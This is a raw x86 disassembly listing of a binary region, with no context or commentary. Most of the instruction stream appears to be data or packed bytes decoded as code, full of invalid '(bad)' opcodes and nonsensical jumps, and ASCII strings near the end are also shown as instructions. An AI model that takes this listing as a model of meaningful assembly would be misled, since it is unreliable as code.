  41fa48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa49:	and    esi,ebp
  41fa4b:	ror    DWORD PTR [edi],0xce
  41fa4e:	inc    edi
  41fa4f:	add    DWORD PTR [edx-0x69],ecx
  41fa52:	push   cs
  41fa53:	fistp  DWORD PTR [edi]
  41fa55:	jmp    0x7ad01338
  41fa5a:	adc    al,0x18
  41fa5c:	xchg   edi,eax
  41fa5d:	mov    ebp,0x9b8fb6f9
  41fa62:	mov    esi,0xf5459fbb
  41fa67:	pop    esi
  41fa68:	sbb    ecx,DWORD PTR [edi]
  41fa6a:	std    
  41fa6b:	dec    eax
  41fa6c:	push   eax
  41fa6d:	mov    eax,0xd078ab4b
  41fa72:	loope  0x41fa42
  41fa74:	sub    edx,esp
  41fa76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa77:	repz repz jl 0x41fa13
  41fa7b:	xchg   esp,eax
  41fa7c:	jge    0x41fa50
  41fa7e:	(bad)  
  41fa7f:	out    0xe4,al
  41fa81:	(bad)  
  41fa82:	dec    edi
  41fa83:	aas    
  41fa84:	in     al,dx
  41fa85:	and    DWORD PTR [esi+0x219599b3],ebx
  41fa8b:	ins    BYTE PTR es:[edi],dx
  41fa8c:	dec    ebp
  41fa8d:	daa    
  41fa8e:	push   esi
  41fa8f:	bound  esp,QWORD PTR [eax+0x26]
  41fa92:	mov    ah,BYTE PTR [ebx]
  41fa94:	repnz cmp BYTE PTR [ecx-0x6a54613a],dl
  41fa9b:	repnz xor DWORD PTR [ebx],esp
  41fa9e:	xchg   DWORD PTR [ecx-0x3abbef13],esi
  41faa4:	fst    DWORD PTR [ebx-0x65b1cfff]
  41faaa:	xchg   dh,bl
  41faac:	push   ebx
  41faad:	into   
  41faae:	enter  0x335b,0x9d
  41fab2:	ja     0x41faa4
  41fab4:	mov    cl,0xa4
  41fab6:	pop    ebp
  41fab7:	and    dl,BYTE PTR [ebp+edi*1-0x4aaf58d4]
  41fabe:	out    0xd1,eax
  41fac0:	pop    ds
  41fac1:	lock xor DWORD PTR [edx-0x639c9399],esi
  41fac8:	cwde   
  41fac9:	add    ecx,DWORD PTR [ecx]
  41facb:	ss sub bl,bh
  41face:	mov    bl,0x4c
  41fad0:	std    
	...
  41fad9:	add    BYTE PTR [eax],al
  41fadb:	outs   dx,DWORD PTR ds:[esi]
  41fadc:	mov    ds:0x7edd2ad4,al
  41fae1:	jmp    edi
  41fae3:	push   edx
  41fae4:	fcmovu st,st(5)
  41fae6:	in     eax,0x6e
  41fae8:	mov    edx,0xa859a073
  41faed:	add    DWORD PTR [eax],eax
  41faef:	scas   al,BYTE PTR es:[edi]
  41faf0:	add    BYTE PTR [eax],al
  41faf2:	add    BYTE PTR [ebx+ebp*4-0x3acc5625],ah
  41faf9:	inc    eax
  41fafa:	retf   0xf3ea
  41fafd:	scas   eax,DWORD PTR es:[edi]
  41fafe:	pop    es
  41faff:	inc    ebx
  41fb00:	popa   
  41fb01:	mov    edx,0x4f82a568
  41fb06:	aad    0x43
  41fb08:	pop    ss
  41fb09:	loope  0x41fae6
  41fb0b:	neg    DWORD PTR [ebp+ebp*2+0x2c]
  41fb0f:	enter  0x1b3e,0x76
  41fb13:	(bad)  
  41fb15:	ret    
  41fb16:	or     DWORD PTR [esi],edx
  41fb18:	inc    edi
  41fb19:	into   
  41fb1a:	fist   DWORD PTR [edi]
  41fb1c:	iret   
  41fb1d:	iret   
  41fb1e:	jbe    0x41facc
  41fb20:	fwait
  41fb21:	mov    eax,0x7fb33186
  41fb26:	mov    dh,0x2
  41fb28:	push   ecx
  41fb29:	pop    ebp
  41fb2a:	fcmovnu st,st(5)
  41fb2c:	(bad)  
  41fb2d:	jecxz  0x41fb9c
  41fb2f:	push   edi
  41fb30:	ss jbe 0x41fb37
  41fb33:	enter  0x50a,0x98
  41fb37:	mov    edi,0x27f7e8ea
  41fb3c:	sub    BYTE PTR ds:0xecaf5bdf,ch
  41fb42:	in     al,0x62
  41fb44:	and    BYTE PTR [ebx],dl
  41fb46:	shr    DWORD PTR [si+0x32],cl
  41fb4a:	rcr    BYTE PTR [ebx+0x62],cl
  41fb4d:	jno    0x41fb9e
  41fb4f:	add    BYTE PTR [ecx-0x5],dh
  41fb52:	dec    esi
  41fb53:	(bad)  
  41fb54:	mov    edi,0x6729863b
  41fb59:	test   al,0x48
  41fb5b:	jg     0x41fb3d
  41fb5d:	nop
  41fb5e:	push   edx
  41fb5f:	je     0x41fba2
  41fb61:	sahf   
  41fb62:	mov    dh,0x52
  41fb64:	iret   
  41fb65:	jmp    0x41fba3
  41fb67:	add    BYTE PTR [eax],ah
  41fb69:	adc    BYTE PTR [esi],ah
  41fb6b:	jne    0x41fb2b
  41fb6d:	ja     0x41fb40
  41fb6f:	neg    DWORD PTR [ebx+0x56c15190]
  41fb75:	(bad)  
  41fb76:	not    BYTE PTR [edi]
  41fb78:	sbb    ebp,DWORD PTR [ebp+0x2daef472]
  41fb7e:	sub    edx,esp
  41fb80:	(bad)  
  41fb81:	int3   
  41fb82:	xchg   esp,eax
  41fb83:	daa    
  41fb84:	js     0x41fbb0
  41fb86:	fdivp  st(0),st
  41fb88:	jp     0x41fb19
  41fb8a:	push   ds
  41fb8b:	out    0xe9,al
  41fb8d:	adc    eax,eax
  41fb8f:	hlt    
  41fb90:	jb     0x41fb56
  41fb92:	out    0x95,al
  41fb94:	daa    
  41fb95:	or     eax,0xbab9d57b
  41fb9a:	imul   ecx,DWORD PTR ds:0x96d31fd0,0x3e
	...
  41fba9:	add    BYTE PTR [eax],al
  41fbab:	stc    
  41fbac:	sbb    al,al
  41fbae:	inc    esi
  41fbaf:	jecxz  0x41fb8f
  41fbb1:	(bad)  
  41fbb2:	mov    edi,0xe1f1bc83
  41fbb7:	icebp  
  41fbb8:	inc    esp
  41fbb9:	das    
  41fbba:	pop    DWORD PTR [edi]
  41fbbc:	test   eax,0xae0001
  41fbc1:	add    BYTE PTR [eax],al
  41fbc3:	adc    BYTE PTR [edi+0x676466a2],cl
  41fbc9:	mov    WORD PTR [esi-0xf],gs
  41fbcc:	push   ecx
  41fbcd:	xchg   edx,eax
  41fbce:	inc    eax
  41fbcf:	dec    esi
  41fbd0:	outs   dx,BYTE PTR ds:[esi]
  41fbd1:	hlt    
  41fbd2:	and    BYTE PTR [edi],0x74
  41fbd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbd6:	xor    ecx,esp
  41fbd8:	pop    edx
  41fbd9:	dec    esi
  41fbda:	cli    
  41fbdb:	(bad)  es:[ecx]
  41fbde:	mov    BYTE PTR ds:0xf2fa1dea,bh
  41fbe4:	in     eax,dx
  41fbe5:	arpl   WORD PTR [edi],bx
  41fbe7:	cmp    edx,DWORD PTR [ebx-0x20884460]
  41fbed:	mov    ecx,0x5db6e4d4
  41fbf2:	fmulp  st(5),st
  41fbf4:	or     DWORD PTR [edi],ebx
  41fbf6:	jno    0x41fc4a
  41fbf8:	push   esp
  41fbf9:	shl    DWORD PTR [ebp+ebx*2+0x467a8fac],0xbe
  41fc01:	pop    ebp
  41fc02:	mov    eax,ds:0x46027c5f
  41fc07:	int3   
  41fc08:	shr    DWORD PTR [edi],0x62
  41fc0b:	adc    dl,BYTE PTR [ecx]
  41fc0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc0e:	loop   0x41fc3f
  41fc10:	jae    0x41fc39
  41fc12:	push   esi
  41fc13:	sbb    DWORD PTR [ebp-0x79],ebp
  41fc16:	fcmovnb st,st(5)
  41fc18:	retf   0xa4a3
  41fc1b:	ds inc ebp
  41fc1d:	jle    0x41fc79
  41fc1f:	(bad)  
  41fc20:	xor    al,0xb
  41fc22:	or     eax,0xe015971c
  41fc27:	addr16 push cs
  41fc29:	sbb    eax,esi
  41fc2b:	sbb    BYTE PTR [esi+0x6d],ah
  41fc2e:	test   al,0x36
  41fc30:	jne    0x41fc03
  41fc32:	or     BYTE PTR [edx],0xc0
  41fc35:	dec    edx
  41fc36:	into   
  41fc37:	gs inc ecx
  41fc39:	aas    
  41fc3a:	loop   0x41fc48
  41fc3c:	out    dx,eax
  41fc3d:	fimul  DWORD PTR [ebp+0xf59358f]
  41fc43:	mov    ch,0xa1
  41fc45:	rcr    BYTE PTR [esi+0x1c],cl
  41fc48:	inc    ebp
  41fc49:	mov    ?,WORD PTR [esi+0x22]
  41fc4c:	cmp    al,0xfc
  41fc4e:	jmp    0x8948:0x69abb2c8
  41fc55:	stos   DWORD PTR es:[edi],eax
  41fc56:	int    0xd3
  41fc58:	fwait
  41fc59:	mov    dh,0x35
  41fc5b:	add    al,0x7e
  41fc5d:	fcmovbe st,st(0)
  41fc5f:	popf   
  41fc60:	add    eax,0xe55af07f
  41fc65:	out    0x8d,al
  41fc67:	mov    edi,0x656de20
  41fc6c:	xor    ah,ah
  41fc6e:	xor    eax,0x8d1d
	...
  41fc7b:	mov    eax,ds:0x3e8336b9
  41fc80:	(bad)  
  41fc81:	mov    ch,0xbb
  41fc83:	icebp  
  41fc84:	and    eax,0xd418c27
  41fc89:	cmp    al,0x5b
  41fc8b:	mov    ch,0xa9
  41fc8d:	add    DWORD PTR [eax],eax
  41fc8f:	scas   al,BYTE PTR es:[edi]
  41fc90:	add    BYTE PTR [eax],al
  41fc92:	add    BYTE PTR [ebx-0x183ef3a5],ah
  41fc98:	retf   0xe6b6
  41fc9b:	test   eax,0x1d6233a6
  41fca0:	call   0x5eced126
  41fca5:	dec    ebx
  41fca6:	xlat   BYTE PTR ds:[bx]
  41fca8:	fmul   QWORD PTR [eax-0x31a3b626]
  41fcae:	xchg   esi,eax
  41fcaf:	xchg   ecx,eax
  41fcb0:	gs dec edx
  41fcb2:	adc    DWORD PTR [edx],ebx
  41fcb4:	xor    al,0x39
  41fcb6:	gs (bad) 
  41fcb8:	pusha  
  41fcb9:	pop    esi
  41fcba:	mov    WORD PTR [esi],?
  41fcbc:	rcr    BYTE PTR [edx-0x1e7c5d54],cl
  41fcc2:	lods   eax,DWORD PTR ds:[esi]
  41fcc3:	xchg   esp,eax
  41fcc4:	or     esi,eax
  41fcc6:	adc    ecx,ebp
  41fcc8:	adc    ch,BYTE PTR [esi+0x32]
  41fccb:	popa   
  41fccc:	mov    ebx,DWORD PTR cs:[eax+ecx*8]
  41fcd0:	iret   
  41fcd1:	jle    0x41fc62
  41fcd3:	pop    ebx
  41fcd4:	jns    0x41fd35
  41fcd6:	dec    edx
  41fcd7:	popf   
  41fcd8:	push   esi
  41fcd9:	cmp    bl,BYTE PTR [eax]
  41fcdb:	pop    ds
  41fcdc:	mov    ds:0xc11d1a5,al
  41fce1:	data16 repnz and al,0xec
  41fce5:	mov    esp,0x7fa5d197
  41fcea:	xor    ax,0x2cfd
  41fcee:	les    esp,FWORD PTR [esi+ebp*8]
  41fcf1:	popa   
  41fcf2:	inc    ebx
  41fcf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcf4:	push   ds
  41fcf5:	dec    ebp
  41fcf6:	gs jno 0x41fc81
  41fcf9:	cli    
  41fcfa:	and    dh,ah
  41fcfc:	jmp    0x41fc8f
  41fcfe:	test   al,0xea
  41fd00:	pop    eax
  41fd01:	mov    cl,0x55
  41fd03:	repz jp 0x41fcd0
  41fd06:	pop    edx
  41fd07:	iret   
  41fd08:	popa   
  41fd09:	and    cl,BYTE PTR es:[ebx-0x27a7bc1]
  41fd10:	push   ebp
  41fd11:	test   BYTE PTR [ebp-0x54],dl
  41fd14:	adc    edx,DWORD PTR [ecx]
  41fd16:	cmc    
  41fd17:	mov    ecx,DWORD PTR [ecx]
  41fd19:	and    al,0xad
  41fd1b:	arpl   WORD PTR [ecx+0x54],bp
  41fd1e:	inc    edx
  41fd1f:	add    eax,0x629c2307
  41fd24:	mov    eax,ds:0x42e74eb1
  41fd29:	jo     0x41fcee
  41fd2b:	test   al,0x7a
  41fd2d:	add    dh,bh
  41fd2f:	bound  edx,QWORD PTR [ecx+esi*2+0x79ef383]
  41fd36:	mov    eax,ds:0x15e61926
  41fd3b:	add    al,0x65
  41fd3d:	jb     0x41fd08
  41fd3f:	jb     0x41fd51
	...
  41fd49:	add    BYTE PTR [eax],al
  41fd4b:	adc    dl,bh
  41fd4d:	repz or esi,edi
  41fd50:	das    
  41fd51:	cli    
  41fd52:	fist   WORD PTR [ecx]
  41fd54:	dec    ebx
  41fd55:	es nop
  41fd57:	adc    edx,ebp
  41fd59:	pop    ebp
  41fd5a:	add    eax,0x1aa63
  41fd5f:	scas   al,BYTE PTR es:[edi]
  41fd60:	add    BYTE PTR [eax],al
  41fd62:	add    BYTE PTR [edx-0x56],cl
  41fd65:	int3   
  41fd66:	imul   ebp,DWORD PTR [ebx+ecx*1+0x34f468fe],0x3e
  41fd6e:	and    BYTE PTR [eax+eax*4],0xa8
  41fd72:	push   ss
  41fd73:	std    
  41fd74:	(bad)  
  41fd75:	cld    
  41fd76:	push   0xd1510a2b
  41fd7b:	push   edi
  41fd7c:	xor    ch,BYTE PTR [bp+0x629d]
  41fd81:	rcl    DWORD PTR [edx],1
  41fd83:	cdq    
  41fd84:	mov    eax,ds:0x65228306
  41fd89:	sub    al,0xf1
  41fd8b:	xchg   esi,eax
  41fd8c:	cmp    BYTE PTR ds:0x1ade2ec4,0xbc
  41fd93:	(bad)  
  41fd94:	cwde   
  41fd95:	inc    ebp
  41fd96:	ret    0xd522
  41fd99:	loop   0x41fd89
  41fd9b:	ret    0x319e
  41fd9e:	sub    ebx,DWORD PTR ds:0x107b2105
  41fda4:	sbb    edx,ebp
  41fda6:	xor    al,0x8d
  41fda8:	or     ah,BYTE PTR [ebx]
  41fdaa:	mov    ah,0xb8
  41fdac:	scas   eax,DWORD PTR es:[edi]
  41fdad:	neg    eax
  41fdaf:	in     eax,0x94
  41fdb1:	pop    ecx
  41fdb2:	test   BYTE PTR [edx+0x5e],0xfb
  41fdb6:	call   0x1cd4:0xb624b05b
  41fdbd:	adc    esp,DWORD PTR [edi+0x6e186781]
  41fdc3:	sar    DWORD PTR [ebp-0x77],cl
  41fdc6:	clc    
  41fdc7:	inc    esi
  41fdc8:	nop    eax
  41fdcb:	add    ah,BYTE PTR [edi+0x5d]
  41fdce:	push   0x7be0f429
  41fdd3:	mov    edx,0x3f5559f9
  41fdd8:	popf   
  41fdd9:	xlat   BYTE PTR ds:[ebx]
  41fdda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fddb:	and    cl,BYTE PTR ds:0x5fa86e75
  41fde1:	inc    edx
  41fde2:	into   
  41fde3:	sub    BYTE PTR [edi+0x7d],ah
  41fde6:	and    bh,BYTE PTR [ebp+eiz*4-0x75]
  41fdea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdeb:	in     eax,0xfa
  41fded:	jne    0x41fd8a
  41fdef:	(bad)  
  41fdf0:	addr16 or edi,esi
  41fdf3:	rol    BYTE PTR [ecx-0x4f6e1184],cl
  41fdf9:	in     al,dx
  41fdfa:	dec    ebx
  41fdfb:	cmp    BYTE PTR [edx-0x3d],0xac
  41fdff:	das    
  41fe00:	mov    esp,0xabcb26e0
  41fe05:	ror    BYTE PTR [esi+edx*4],1
  41fe08:	mov    ah,dl
  41fe0a:	test   eax,0x4688d6fa
  41fe0f:	mov    eax,ds:0xbe
  41fe14:	add    BYTE PTR [eax],al
  41fe16:	add    BYTE PTR [eax],al
  41fe18:	add    BYTE PTR [eax],al
  41fe1a:	add    BYTE PTR [edx],dl
  41fe1c:	mov    edx,0xe6f8c6d8
  41fe21:	push   ds
  41fe22:	(bad)  
  41fe23:	adc    bl,dh
  41fe25:	cwde   
  41fe26:	out    dx,al
  41fe27:	pop    ss
  41fe28:	jge    0x41fea6
  41fe2a:	mov    ebp,0x1ab11
  41fe2f:	scas   al,BYTE PTR es:[edi]
  41fe30:	add    BYTE PTR [eax],al
  41fe32:	add    BYTE PTR [ecx],dh
  41fe34:	push   esp
  41fe35:	arpl   di,bx
  41fe37:	mov    ds:0x698be5db,eax
  41fe3c:	(bad)  
  41fe3e:	xchg   ecx,eax
  41fe3f:	stos   BYTE PTR es:[edi],al
  41fe40:	adc    ch,dh
  41fe42:	scas   eax,DWORD PTR es:[edi]
  41fe43:	sti    
  41fe44:	inc    eax
  41fe45:	int3   
  41fe46:	push   eax
  41fe47:	dec    edi
  41fe48:	sbb    DWORD PTR [esi-0x4e8e9bc7],ebp
  41fe4e:	or     eax,0x1e302465
  41fe53:	int3   
  41fe54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe55:	lea    ecx,[ebp+0x43afcece]
  41fe5b:	add    DWORD PTR [edx*4+0x7881541c],esi
  41fe62:	cmp    eax,0x223b0ce
  41fe67:	aas    
  41fe68:	add    eax,eax
  41fe6a:	sub    al,0xa9
  41fe6d:	push   esi
  41fe6e:	enter  0xa470,0x71
  41fe72:	in     eax,dx
  41fe73:	xor    eax,DWORD PTR [edx-0x64]
  41fe76:	cmc    
  41fe77:	fdivr  DWORD PTR [ebx+0xa5c443e]
  41fe7d:	pop    es
  41fe7e:	xor    dh,BYTE PTR [edx]
  41fe80:	push   edi
  41fe81:	inc    ecx
  41fe82:	inc    esp
  41fe83:	jbe    0x41fec7
  41fe85:	jmp    eax
  41fe87:	retf   0x5a45
  41fe8a:	xchg   edx,eax
  41fe8b:	pusha  
  41fe8c:	jmp    DWORD PTR [eax]
  41fe8e:	mov    BYTE PTR [edi],al
  41fe90:	sbb    BYTE PTR [edi-0x9],dl
  41fe93:	int    0xf9
  41fe95:	xchg   edx,eax
  41fe96:	in     eax,dx
  41fe97:	push   cs
  41fe98:	and    BYTE PTR [ebp-0x47086d81],dh
  41fe9e:	push   eax
  41fe9f:	in     al,dx
  41fea0:	test   BYTE PTR [ebp+edx*2+0x7d2bf54f],ch
  41fea7:	repz jne 0x41ff10
  41feaa:	xchg   esi,eax
  41feab:	sbb    bh,BYTE PTR [ecx]
  41fead:	mov    ebx,0x2e964b65
  41feb2:	adc    BYTE PTR [esi+0x65],bl
  41feb5:	sub    DWORD PTR [ebx-0x43],0xd8c9f53e
  41febc:	jge    0x41fe9a
  41febe:	sub    BYTE PTR [ecx-0x62],al
  41fec1:	pop    ecx
  41fec2:	jge    0x41fe96
  41fec4:	pop    ecx
  41fec5:	push   esi
  41fec6:	gs sbb al,0xd4
  41fec9:	mov    ebp,0x2fb20a15
  41fece:	cmc    
  41fecf:	pop    eax
  41fed0:	add    al,BYTE PTR [edx-0x4324cae0]
  41fed6:	xor    ecx,esp
  41fed8:	xor    ebp,DWORD PTR [edi-0x1e50cb9]
  41fede:	es jge 0x41ff4f
	...
  41fee9:	add    BYTE PTR [eax],al
  41feeb:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41fef1:	inc    edx
  41fef2:	add    BYTE PTR [eax],cl
  41fef4:	nop
  41fef5:	inc    edx
  41fef6:	add    BYTE PTR [eax+edx*4],cl
  41fef9:	inc    edx
  41fefa:	add    BYTE PTR [eax],dl
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],dl
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],bl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],bl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [esi+0x49],cl
  41ff0d:	dec    esi
  41ff0e:	pop    edi
  41ff0f:	pop    edx
  41ff10:	dec    edx
  41ff11:	inc    ecx
  41ff12:	xor    eax,DWORD PTR [eax]
  41ff14:	push   ebx
  41ff15:	push   edi
  41ff16:	inc    edi
  41ff17:	cmp    DWORD PTR [edi+0x41],ebx
  41ff1a:	pop    eax
  41ff1b:	ss push esi
  41ff1d:	pop    ecx
  41ff1e:	add    BYTE PTR [ebx+0x43],dl
  41ff21:	inc    ebp
  41ff22:	pop    edi
  41ff23:	inc    ecx
  41ff24:	pop    eax
  41ff25:	push   edi
  41ff26:	dec    eax
  41ff27:	inc    edx
  41ff28:	pop    edi
  41ff29:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff2c:	dec    ecx
  41ff2d:	add    BYTE PTR [ecx+0x46],al
  41ff30:	cmp    DWORD PTR [edx],esi
  41ff32:	xor    ebx,DWORD PTR [edi+0x32]
  41ff35:	aaa    
  41ff36:	inc    esp
  41ff37:	inc    esp
  41ff38:	pop    edi
  41ff39:	xor    eax,0x41545800
  41ff3e:	pop    edi
  41ff3f:	push   ecx
  41ff40:	push   esp
  41ff41:	inc    esi
  41ff42:	push   ebp
  41ff43:	cmp    DWORD PTR [eax],eax
  41ff45:	push   edi
  41ff46:	push   ebp
  41ff47:	inc    ecx
  41ff48:	xor    dh,BYTE PTR [ebx]
  41ff4a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff4d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff51:	cmp    DWORD PTR [edi+0x38],ebx
  41ff54:	dec    ecx
  41ff55:	cmp    DWORD PTR [edx+0x36],ebx
  41ff58:	pop    edi
  41ff59:	dec    edx
  41ff5a:	xor    BYTE PTR [edx+0x34],cl
  41ff5d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff61:	xor    esi,DWORD PTR [eax]
  41ff63:	pop    edi
  41ff64:	inc    edx
  41ff65:	dec    ebx
  41ff66:	pop    eax
  41ff67:	pop    eax
  41ff68:	xor    eax,0x51414d00
  41ff6d:	pop    edi
  41ff6e:	inc    ecx
  41ff6f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff72:	inc    ecx
  41ff73:	dec    ebx
  41ff74:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff7a:	inc    ebp
  41ff7b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff7e:	ss dec eax
  41ff80:	dec    ebx
  41ff81:	add    BYTE PTR [ebp+0x57],al
  41ff84:	xor    DWORD PTR [edi+0x31],ebx
  41ff87:	dec    ebx
  41ff88:	xor    eax,DWORD PTR [ecx+0x30]
  41ff8b:	push   ebx
  41ff8c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff90:	aaa    
  41ff91:	pop    edi
  41ff92:	push   edx
  41ff93:	dec    eax
  41ff94:	dec    ebp
  41ff95:	cmp    BYTE PTR [edi+0x37],bl
  41ff98:	inc    esi
  41ff99:	xor    eax,0x35005500
  41ff9e:	add    BYTE PTR [ebx+0x0],al
  41ffa1:	pop    edi
  41ffa2:	add    BYTE PTR [ecx+0x0],bl
  41ffa5:	dec    ecx
  41ffa6:	add    BYTE PTR [ebx+0x0],dl
  41ffa9:	xor    al,BYTE PTR [eax]
  41ffab:	pop    edi
  41ffac:	add    BYTE PTR [edx+0x0],dl
  41ffaf:	add    BYTE PTR [eax],al
  41ffb1:	push   eax
  41ffb2:	add    BYTE PTR [ebp+0x0],dl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [eax],dh
  41ffb8:	add    BYTE PTR [edi+0x0],bl
  41ffbb:	inc    ebx
  41ffbc:	add    BYTE PTR [esi],dh
  41ffbe:	add    BYTE PTR [ebp+0x0],al
  41ffc1:	xor    al,BYTE PTR [eax]
  41ffc3:	pop    edi
  41ffc4:	add    BYTE PTR [ebp+0x0],cl
  41ffc7:	xor    al,0x0
  41ffc9:	dec    edx
  41ffca:	add    BYTE PTR [edx+0x0],dl
  41ffcd:	push   ebp
  41ffce:	add    BYTE PTR [eax],al
  41ffd0:	add    BYTE PTR [esi+0x0],cl
  41ffd3:	cmp    DWORD PTR [eax],eax
  41ffd5:	push   eax
  41ffd6:	add    BYTE PTR [edi+0x0],bl
  41ffd9:	push   ebp
  41ffda:	add    BYTE PTR [ecx],bh
  41ffdc:	add    BYTE PTR [esi],dh
  41ffde:	add    BYTE PTR [eax],dh
  41ffe0:	add    BYTE PTR [ecx],dh
  41ffe2:	add    BYTE PTR [edi+0x0],bl
  41ffe5:	dec    edi
  41ffe6:	add    BYTE PTR [esi+0x0],cl
  41ffe9:	push   esp
  41ffea:	add    BYTE PTR [eax],bh
  41ffec:	add    BYTE PTR [eax],al
  41ffee:	add    BYTE PTR [eax+eax*1+0x34],cl
  41fff2:	add    BYTE PTR [eax+eax*1+0x31],al
  41fff6:	add    BYTE PTR [edi+0x0],bl
  41fff9:	dec    ebx
  41fffa:	add    BYTE PTR [ecx],dh
  41fffc:	add    BYTE PTR [ebp+0x0],al
  41ffff:	pop    edi
  420000:	add    BYTE PTR [edx+0x0],bl
  420003:	add    BYTE PTR [eax],al
  420005:	push   esp
  420006:	add    BYTE PTR [edi],dh
  420008:	add    BYTE PTR [ebx+0x0],al
  42000b:	pop    edi
  42000c:	add    BYTE PTR [edx+0x0],al
  42000f:	xor    al,BYTE PTR [eax]
  420011:	xor    DWORD PTR [eax],eax
  420013:	push   ebx
  420014:	add    BYTE PTR [ecx],dh
  420016:	add    BYTE PTR [ecx],bh
  420018:	add    BYTE PTR [edx+0x0],al
  42001b:	add    BYTE PTR [eax],al
  42001d:	inc    edi
  42001e:	add    BYTE PTR [ebp+0x0],al
  420021:	xor    al,0x0
  420023:	cmp    BYTE PTR [eax],al
  420025:	add    BYTE PTR [eax],al
  420027:	add    BYTE PTR [eax+0x42],dl
  42002a:	add    BYTE PTR [eax+edx*2],al
  42002d:	inc    edx
  42002e:	add    BYTE PTR [eax],cl
  420030:	push   eax
  420031:	inc    edx
  420032:	add    BYTE PTR [eax+edx*2],cl
  420035:	inc    edx
  420036:	add    BYTE PTR [eax],dl
  420038:	push   eax
  420039:	inc    edx
  42003a:	add    BYTE PTR [eax+edx*2],dl
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],bl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],bl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],ah
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],ah
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],ch
  420050:	push   eax
  420051:	inc    edx
	...
  420062:	add    BYTE PTR [eax],al
  420064:	call   0x0:0x4d3ef2
  42006b:	add    BYTE PTR [edx+0x1000200],dl
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [ecx],al
  420075:	add    BYTE PTR [eax],al
  420077:	add    BYTE PTR [ecx],al
  420079:	add    BYTE PTR [eax],al
  42007b:	add    BYTE PTR [eax-0x73fffe00],cl
  420081:	add    BYTE PTR [edx],al
  420083:	add    BYTE PTR [eax-0x23fffe00],dl
  420089:	cmp    al,0x0
  42008b:	add    BYTE PTR [esi+0x200],bl
  420091:	add    BYTE PTR [edi+0x6f],dl
  420094:	jb     0x4200fa
  420096:	push   edi
  420097:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42009e:	aas    
  42009f:	inc    ebx
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	outs   dx,DWORD PTR ds:[esi]
  4200a2:	jae    0x420109
  4200a4:	push   edi
  4200a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200ac:	popa   
  4200ad:	je     0x420118
  4200af:	outs   dx,DWORD PTR ds:[esi]
  4200b0:	outs   dx,BYTE PTR ds:[esi]
  4200b1:	inc    ebx
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	outs   dx,DWORD PTR ds:[esi]
  4200b4:	jae    0x42011b
  4200b6:	push   edi
  4200b7:	imul   eax,DWORD PTR [eax],0x0
	...
